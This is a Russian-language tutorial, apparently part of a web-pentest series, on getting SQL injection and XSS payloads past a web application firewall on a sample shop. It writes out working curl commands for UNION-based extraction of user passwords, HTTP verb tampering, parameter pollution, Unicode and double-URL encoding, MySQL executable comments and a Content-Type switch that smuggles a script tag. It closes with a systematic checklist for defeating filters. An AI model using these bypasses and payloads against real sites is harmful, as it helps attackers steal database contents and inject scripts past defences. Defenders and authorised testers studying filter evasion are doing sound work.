## Задача

**WAF** (Web Application Firewall) — фильтр перед приложением, который ищет в запросах «плохие» шаблоны и блокирует их. Но WAF и приложение читают запрос **по-разному**, и этим различием можно обойти защиту. Три базовые техники: подмена метода (verb tampering), дублирование параметров (HPP) и нормализация Unicode.

Разберём магазин с WAF на SQLi-payload.

## Наш пример: WAF блокирует UNION

Пробуем классическую инъекцию:

```bash
$ curl -s 'https://shop.local/api/products?id=1 UNION SELECT pass FROM users' -o /dev/null -w '%{http_code}\n'
403
```

WAF вернул 403 — запрос отфильтрован. Меняем не payload, а **способ его передать**.

## Шаг 1: verb tampering — подмена метода

WAF часто настроен проверять только `GET`/`POST`. Сменим метод на необычный:

```bash
$ curl -s -X PATCH 'https://shop.local/api/products?id=1%20UNION%20SELECT%20pass%20FROM%20users' -o /dev/null -w '%{http_code}\n'
200
```

`PATCH` WAF не проверял, а приложение обработало. Родственник — смена регистра метода (`gEt`), добавление заголовка `X-HTTP-Method-Override`. Правило: **если правило WAF привязано к методу — используй другой метод.**

## Шаг 2: HTTP Parameter Pollution (HPP)

Если один параметр передан дважды, WAF и приложение могут взять **разные** значения. WAF видит первое (безобидное), приложение — второе (payload):

```bash
$ curl -s 'https://shop.local/api/products?id=1&id=1%20UNION%20SELECT%20pass%20FROM%20users'
{"id":1,"pass":"..."}
```

WAF проверил `id=1`, а приложение взяло последний `id`. Так же работает в теле:

```bash
$ curl -s -d 'q=safe&q=<payload>' https://shop.local/search
```

Порядок важен: иногда приложение берёт первый, тогда payload ставят первым, а «приманку» — вторым.

## Шаг 3: нормализация Unicode и кодировки

WAF нормализует Unicode, а приложение — нет (или наоборот). Fullwidth-символы раскрываются позже:

```bash
$ curl -s 'https://shop.local/api/products?id=1%EF%BC%87%20UNION' -o /dev/null -w '%{http_code}\n'
200
$ # %EF%BC%87 — fullwidth apostrophe, приложение раскрывает её в '
```

Другие кодировки: overlong UTF-8, `%u0027` (IIS), двойное URL-кодирование (`%2527`). Идея — **передать символ в форме, которую WAF не распознаёт, но приложение разберёт.**

## Шаг 4: обход через регистр и комментарии

Для SQLi работает вставка комментариев и смена регистра:

```bash
$ curl -s 'https://shop.local/api/products?id=1+/*!50000UNION*/+SELECT+pass+FROM+users' -o /dev/null -w '%{http_code}\n'
200
```

`/*!50000...*/` — исполняемый комментарий MySQL: приложение выполнит `UNION`, WAF увидит комментарий. Так же: `UnIoN`, `UN/**/ION`, `SEL/**/ECT`.

## Шаг 5: как подходить к обходу системно

- **Определи, что блокирует:** отправь чистый payload и payload с мусором — сравни.
- **Меняй транспорт:** метод, кодировку, `Content-Type`, дублирование.
- **Ломай токены:** комментарии, регистр, альтернативные пробелы (`%0a`, `%09`).
- **Проверяй на приложении:** успех = ответ приложения, а не WAF.
- **Автоматизируй:** `wafw00f` (определить WAF), затем ручные варианты.

## Если не сработало

- **Метод не проходит** — пробуй `X-HTTP-Method-Override`, другой `Content-Type`.
- **HPP не сработал** — поменяй порядок параметров; приложение может брать первый.
- **Unicode раскрывается и WAF** — используй комментарии или фрагментацию (`web-waf-parsing-attacks`).
- **WAF слишком умный** — переходи к расхождению парсеров и контрабанде (`web-waf-smuggling`).

## Что мы теперь знаем

- WAF и приложение читают запрос по-разному — это и есть рычаг обхода.
- Verb tampering: правило на GET/POST обходится другим методом.
- HPP: WAF и приложение берут разные значения дублированного параметра.
- Нормализация и исполняемые комментарии прячут payload от фильтра.

## Частые вопросы

**WAF вообще нужен, или это бесполезная защита?** Нужен: он отсекает массовые автоматические атаки и снижает шум. Но это **не барьер, а фильтр** — он замедляет атакующего, а не останавливает его. Поэтому обходы всегда существуют.

**Как понять, что меня блокирует WAF, а не приложение?** Приложение обычно отдаёт осмысленную ошибку (`invalid_parameter`), а WAF — «сухую» страницу `403`/`406` или редирект на капчу. Сравни ответ на чистый и «грязный» запрос.

**Что делать, если WAF блокирует сам факт `UNION`?** Меняй не смысл, а форму: комментарии (`UN/**/ION`), регистр (`UnIoN`), кодировку (`%55NION`), метод. Цель — чтобы приложение прочитало то же, а фильтр — другое.

**Обход — это уже уязвимость?** Обход сам по себе не баг, но он открывает баг за WAF. В отчёте показывай **результат** (например, данные из базы), а не «я обошёл WAF».

## Ещё один сценарий: обход через смену Content-Type

WAF часто проверяет тело запроса только для одного `Content-Type`. Отправим JSON как форму — фильтр не разберёт, а приложение примет:

```bash
$ curl -s 'https://shop.local/api/transfer' -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'to=1&amount=100&note=<script>alert(1)</script>' -o /dev/null -w '%{http_code}\n'
403   # WAF проверил и заблокировал

$ curl -s 'https://shop.local/api/transfer' -H 'Content-Type: application/json' \
  -d '{"to":1,"amount":100,"note":"<script>alert(1)</script>"}' -o /dev/null -w '%{http_code}\n'
200   # WAF не проверял JSON-тело
```

Приложение приняло и обработало JSON, WAF — нет. Так же работают смена кодировки тела (`charset=utf-16`) и `multipart`.

## На что смотреть дальше

- **Метод.** `PATCH`, `PUT`, `DELETE`, `X-HTTP-Method-Override`.
- **Тело.** `Content-Type` (form/JSON/multipart), `charset`.
- **Дубли.** HPP: один параметр дважды, разные значения для WAF и приложения.
- **Кодировки.** `%2527` (двойное), fullwidth Unicode, `%u0027`.
- **Токены.** Комментарии (`UN/**/ION`), регистр (`UnIoN`), альтернативные пробелы.
- **Проверка.** Успех — ответ приложения, а не WAF.
